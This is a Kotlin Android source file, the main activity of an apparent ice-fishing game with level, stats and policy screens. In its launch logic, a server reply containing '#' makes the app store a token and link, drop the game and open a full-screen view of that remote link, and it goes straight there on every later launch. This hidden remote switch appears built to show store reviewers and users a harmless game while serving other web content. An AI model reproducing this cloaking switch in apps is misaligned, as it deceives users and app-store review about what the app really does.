package com.icefisher.game

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.size
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.key
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import com.icefisher.game.data.NetworkManager
import com.icefisher.game.data.StorageManager
import com.icefisher.game.ui.screens.GameScreen
import com.icefisher.game.ui.screens.LevelSelectScreen
import com.icefisher.game.ui.screens.MenuScreen
import com.icefisher.game.ui.screens.PolicyScreen
import com.icefisher.game.ui.screens.StatsScreen
import com.icefisher.game.ui.theme.IceBlue
import com.icefisher.game.ui.theme.IceFisherTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {

    private lateinit var storageManager: StorageManager
    private lateinit var networkManager: NetworkManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        storageManager = StorageManager(this)
        networkManager = NetworkManager(this)

        setContent {
            IceFisherTheme {
                AppContent(
                    storageManager = storageManager,
                    networkManager = networkManager,
                    onOpenFullScreen = { link ->
                        val intent = Intent(this@MainActivity, FullScreenActivity::class.java)
                        intent.putExtra("content_link", link)
                        startActivity(intent)
                        finish()
                    }
                )
            }
        }
    }
}

sealed class AppScreen {
    object Loading : AppScreen()
    object Menu : AppScreen()
    object LevelSelect : AppScreen()
    object Stats : AppScreen()
    data class Game(val levelIndex: Int) : AppScreen()
    data class Policy(val link: String) : AppScreen()
}

@Composable
fun AppContent(
    storageManager: StorageManager,
    networkManager: NetworkManager,
    onOpenFullScreen: (String) -> Unit
) {
    var currentScreen by remember { mutableStateOf<AppScreen>(AppScreen.Loading) }
    var policyLink by remember { mutableStateOf<String?>(null) }
    var currentLevel by remember { mutableIntStateOf(0) }
    var maxUnlockedLevel by remember { mutableIntStateOf(0) }
    var bestScores by remember { mutableStateOf(listOf(0, 0, 0, 0, 0)) }
    val coroutineScope = rememberCoroutineScope()

    LaunchedEffect(Unit) {
        withContext(Dispatchers.IO) {
            val token = storageManager.getToken()

            if (token != null) {
                val savedLink = storageManager.getLink()
                if (savedLink != null) {
                    withContext(Dispatchers.Main) {
                        onOpenFullScreen(savedLink)
                    }
                    return@withContext
                }
            }

            val response = networkManager.fetchServerResponse()

            if (response != null) {
                if (response.contains("#")) {
                    val parts = response.split("#", limit = 2)
                    val newToken = parts[0]
                    val contentLink = parts[1]

                    storageManager.saveToken(newToken)
                    storageManager.saveLink(contentLink)

                    withContext(Dispatchers.Main) {
                        onOpenFullScreen(contentLink)
                    }
                } else {
                    storageManager.savePolicyLink(response)
                    policyLink = response
                    maxUnlockedLevel = storageManager.getMaxUnlockedLevel()
                    bestScores = storageManager.getAllBestScores()
                    withContext(Dispatchers.Main) {
                        currentScreen = AppScreen.Menu
                    }
                }
            } else {
                maxUnlockedLevel = storageManager.getMaxUnlockedLevel()
                bestScores = storageManager.getAllBestScores()
                withContext(Dispatchers.Main) {
                    currentScreen = AppScreen.Menu
                }
            }
        }
    }

    fun saveAndGoToLevelSelect(levelIndex: Int, caughtFish: Int, passed: Boolean) {
        coroutineScope.launch(Dispatchers.IO) {
            storageManager.saveBestScore(levelIndex, caughtFish)
            if (passed) {
                storageManager.unlockLevel(levelIndex + 1)
            }
            maxUnlockedLevel = storageManager.getMaxUnlockedLevel()
            bestScores = storageManager.getAllBestScores()
            withContext(Dispatchers.Main) {
                currentScreen = AppScreen.LevelSelect
            }
        }
    }

    when (val screen = currentScreen) {
        is AppScreen.Loading -> {
            LoadingScreen()
        }
        is AppScreen.Menu -> {
            BackHandler {}
            MenuScreen(
                onPlayClick = {
                    currentScreen = AppScreen.LevelSelect
                },
                onStatsClick = {
                    currentScreen = AppScreen.Stats
                },
                onPolicyClick = {
                    policyLink?.let { link ->
                        currentScreen = AppScreen.Policy(link)
                    }
                }
            )
        }
        is AppScreen.LevelSelect -> {
            BackHandler {
                currentScreen = AppScreen.Menu
            }
            LevelSelectScreen(
                maxUnlockedLevel = maxUnlockedLevel,
                bestScores = bestScores,
                onLevelSelect = { level ->
                    currentLevel = level
                    currentScreen = AppScreen.Game(level)
                },
                onBackClick = {
                    currentScreen = AppScreen.Menu
                }
            )
        }
        is AppScreen.Stats -> {
            BackHandler {
                currentScreen = AppScreen.Menu
            }
            StatsScreen(
                bestScores = bestScores,
                maxUnlockedLevel = maxUnlockedLevel,
                onBackClick = {
                    currentScreen = AppScreen.Menu
                }
            )
        }
        is AppScreen.Game -> {
            key(screen.levelIndex) {
                GameScreen(
                    levelIndex = screen.levelIndex,
                    onBackClick = { caughtFish, passed ->
                        saveAndGoToLevelSelect(screen.levelIndex, caughtFish, passed)
                    },
                    onLevelComplete = { caughtFish, passed ->
                        coroutineScope.launch(Dispatchers.IO) {
                            storageManager.saveBestScore(screen.levelIndex, caughtFish)
                            if (passed) {
                                storageManager.unlockLevel(screen.levelIndex + 1)
                            }
                            maxUnlockedLevel = storageManager.getMaxUnlockedLevel()
                            bestScores = storageManager.getAllBestScores()

                            withContext(Dispatchers.Main) {
                                if (passed && currentLevel < 4) {
                                    currentLevel++
                                    currentScreen = AppScreen.Game(currentLevel)
                                } else {
                                    currentScreen = AppScreen.LevelSelect
                                }
                            }
                        }
                    }
                )
            }
        }
        is AppScreen.Policy -> {
            BackHandler {
                currentScreen = AppScreen.Menu
            }
            PolicyScreen(
                policyLink = screen.link,
                onBackClick = {
                    currentScreen = AppScreen.Menu
                }
            )
        }
    }
}

@Composable
fun LoadingScreen() {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.Black),
        contentAlignment = Alignment.Center
    ) {
        CircularProgressIndicator(
            modifier = Modifier.size(48.dp),
            color = IceBlue,
            strokeWidth = 4.dp
        )
    }
}
